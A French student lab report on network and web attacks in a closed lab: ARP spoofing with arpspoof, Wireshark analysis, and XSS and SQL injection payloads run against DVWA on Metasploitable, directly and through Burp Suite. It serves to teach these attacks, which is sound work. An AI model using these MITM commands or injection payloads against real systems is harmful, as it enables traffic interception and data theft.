# Mini-Projet 3 
**Cours : Sécurité des Systèmes d'Information – ECE 2025-2026**

---

## Partie 3A – ARP Spoofing

### Réponse

**1. Préparation de l'environnement**

Architecture utilisée :
- VM Kali **Attaquant** : ex. `192.168.1.50`
- VM Kali **Analyseur** : pour Wireshark (partie 3B)
- VM Ubuntu **Victime** : ex. `192.168.1.100`
- Passerelle (routeur) : ex. `192.168.1.1`

```bash
# Sur l'Attaquant : installer les outils
sudo apt install dsniff net-tools -y

# Vérifier la connectivité
ip addr                          # noter l'interface (ex: eth0)
ping 192.168.1.100               # ping vers la Victime
route -n                         # identifier la passerelle
```

**2. Lancement de l'attaque ARP spoofing**

Ouvrir **deux terminaux** sur la VM Attaquant :

Terminal 1 – se faire passer pour la passerelle auprès de la victime :
```bash
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

Terminal 2 – se faire passer pour la victime auprès de la passerelle :
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

> 📸 *[Insérer ici : screenshot des deux terminaux arpspoof en cours d'exécution]*

**3. Vérification de l'attaque**

Sur la VM **Victime** :
```bash
arp -a
# L'adresse MAC associée à l'IP de la passerelle doit être celle de l'Attaquant
```

> 📸 *[Insérer ici : screenshot de `arp -a` sur la Victime montrant le cache ARP empoisonné]*

**Pourquoi ?** ARP n'a pas de mécanisme d'authentification : n'importe qui peut envoyer une réponse ARP non sollicitée. L'attaquant se place ainsi en **Man-in-the-Middle** entre la victime et la passerelle, interceptant tout le trafic.

---

## Partie 3B – Capture et analyse avec Wireshark

### Réponse

**1. Lancement de Wireshark (VM Analyseur)**
```bash
sudo wireshark
```
Sélectionner l'interface réseau connectée au réseau interne (ex: `eth0`), puis cliquer sur l'icône de capture.

**2. Lancer l'attaque ARP (VM Attaquant)**

Relancer les deux commandes `arpspoof` de la partie 3A pendant que Wireshark capture.

**3. Filtres Wireshark utiles**

| Filtre | Description |
|--------|-------------|
| `arp` | Afficher uniquement les trames ARP |
| `arp.opcode == 1` | Requêtes ARP uniquement |
| `arp.opcode == 2` | Réponses ARP uniquement |
| `arp.src.proto_ipv4 == 192.168.1.50` | Trames ARP venant de l'Attaquant |
| `arp.dst.proto_ipv4 == 192.168.1.100` | Trames ARP ciblant la Victime |

**4. Analyse d'une trame ARP spoofée**

Dans une trame ARP capturée, identifier :
- **Sender MAC** : adresse MAC de l'Attaquant
- **Sender IP** : adresse IP de la passerelle (`192.168.1.1`)
- → La victime reçoit "la passerelle a pour MAC celle de l'Attaquant" → cache ARP empoisonné

> 📸 *[Insérer ici : screenshot Wireshark avec filtre `arp` actif et détails d'une trame spoofée visible dans le panneau inférieur]*

**Pourquoi ?** Wireshark opère au niveau de la couche 2 (liaison) et capture toutes les trames sur le segment réseau. On voit clairement les réponses ARP frauduleuses : une même IP (passerelle) associée à une MAC différente de la légitime.

---

## Partie 3C – Exploitation XSS & Injection SQL (DVWA / Metasploitable)

### Réponse

**1. Mise en place de Metasploitable**

Télécharger Metasploitable 2 sur [sourceforge.net/projects/metasploitable](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/), importer le `.vmdk` dans VirtualBox, configurer en réseau interne.

```bash
# Connexion à Metasploitable
# Login : msfadmin / Mot de passe : msfadmin
ifconfig   # noter l'IP, ex: 192.168.1.101
```

Depuis le navigateur de Kali : `http://192.168.1.101/dvwa/`
- Login : `admin` / Mot de passe : `password`
- Aller dans **DVWA Security** → mettre le niveau à **Low**

**2. Exploitation XSS (Cross-Site Scripting)**

Aller dans le menu **XSS (Reflected)**, dans le champ "What's your name?" :

Payload basique (afficher une alerte) :
```html
<script>alert("XSS");</script>
```

Payload de redirection (bonus) :
```html
<script>window.location='http://www.google.com';</script>
```

Cliquer sur **Submit** → une alerte JavaScript apparaît (ou redirection).

> 📸 *[Insérer ici : screenshot de l'alerte JavaScript "XSS" dans le navigateur]*

**Pourquoi ?** L'application réinjecte directement le contenu du champ dans la page HTML sans le filtrer. Le navigateur interprète alors le `<script>` comme du code légitime. En conditions réelles, cela permet de voler des cookies de session.

**3. Exploitation Injection SQL**

Aller dans le menu **SQL Injection**, dans le champ "User ID" :

Payload pour afficher tous les utilisateurs :
```sql
1' or '1'='1
```

Payload pour afficher les noms de tables (bonus) :
```sql
1' union select table_name from information_schema.tables where table_schema = database()#
```

Cliquer sur **Submit** → toutes les entrées de la base de données s'affichent.

> 📸 *[Insérer ici : screenshot du DVWA affichant tous les utilisateurs suite à l'injection SQL]*

**Pourquoi ?** La requête SQL construite par l'application ressemble à `SELECT * FROM users WHERE id='$input'`. En injectant `1' or '1'='1`, la condition devient toujours vraie et retourne toutes les lignes. Sans validation des entrées, l'attaquant contrôle la requête.

---

## Partie 3D – Test avec Burp Suite

### Réponse

**1. Lancement de Burp Suite (VM Kali Attaquant)**
```bash
burpsuite
```
Choisir **Temporary project** → Next → **Start Burp**.

**2. Configuration du proxy Firefox**

Aller dans Firefox → Settings → chercher "proxy" → **Manual proxy configuration** :
- HTTP Proxy : `127.0.0.1`
- Port : `8080`
- Cocher "Use this proxy server for all protocols"

Installer le certificat Burp :
- Aller sur `http://burp` dans Firefox
- Télécharger le **CA Certificate**
- Firefox → Settings → "certificates" → View Certificates → Authorities → Import
- Cocher **"Trust this CA to identify websites"**

> 📸 *[Insérer ici : screenshot de la configuration proxy Firefox + import du certificat Burp]*

**3. Interception d'une requête**

Dans Burp Suite : onglet **Proxy** → **Intercept is ON** (bouton bleu).

Naviguer sur `http://192.168.1.101/dvwa/` → les requêtes apparaissent dans Burp.

> 📸 *[Insérer ici : screenshot d'une requête HTTP interceptée dans l'onglet Proxy de Burp Suite]*

**4. Manipulation via le Repeater – Injection SQL**

Sur la page SQL Injection du DVWA, entrer `1` et cliquer Submit.
Dans Burp → clic droit sur la requête → **Send to Repeater**.

Dans l'onglet **Repeater**, modifier le paramètre `id` :
```
id=1'+or+'1'%3D'1
```
Cliquer sur **Send** → observer la réponse à droite (tous les utilisateurs affichés).

> 📸 *[Insérer ici : screenshot du Repeater avec la requête modifiée et la réponse du serveur contenant les données]*

**5. Manipulation via le Repeater – XSS**

Sur la page XSS (Reflected), entrer un nom et cliquer Submit.
Envoyer au Repeater, modifier le paramètre `name` :
```
name=<script>alert('XSS')</script>
```
Cliquer **Send** → la réponse HTML contient le script injecté.

**6. Désactiver le proxy après les tests**

Firefox → Settings → proxy → **Use system proxy settings** (sinon plus d'accès internet).

**Pourquoi ?** Burp Suite agit comme un proxy intermédiaire entre le navigateur et le serveur. Il permet d'intercepter, analyser et modifier chaque requête HTTP avant qu'elle n'atteigne le serveur — technique fondamentale du pentest web pour manipuler des paramètres normalement cachés.

---

## Récapitulatif des commandes essentielles

| Partie | Commande / Action | Rôle |
|--------|-------------------|------|
| 3A | `sudo arpspoof -i eth0 -t <ip_victime> <ip_passerelle>` | Empoisonner le cache ARP de la victime |
| 3A | `sudo arpspoof -i eth0 -t <ip_passerelle> <ip_victime>` | Empoisonner le cache ARP de la passerelle |
| 3A | `arp -a` (sur la victime) | Vérifier le cache ARP empoisonné |
| 3B | Filtre Wireshark : `arp` | Isoler les trames ARP |
| 3B | Filtre Wireshark : `arp.opcode == 2` | Afficher uniquement les réponses ARP |
| 3C | `<script>alert("XSS");</script>` | Payload XSS basique |
| 3C | `1' or '1'='1` | Payload injection SQL – afficher tous les enregistrements |
| 3D | `burpsuite` | Lancer Burp Suite |
| 3D | Proxy Firefox : `127.0.0.1:8080` | Rediriger le trafic vers Burp Suite |
| 3D | Send to Repeater → modifier → Send | Rejouer et modifier une requête HTTP |
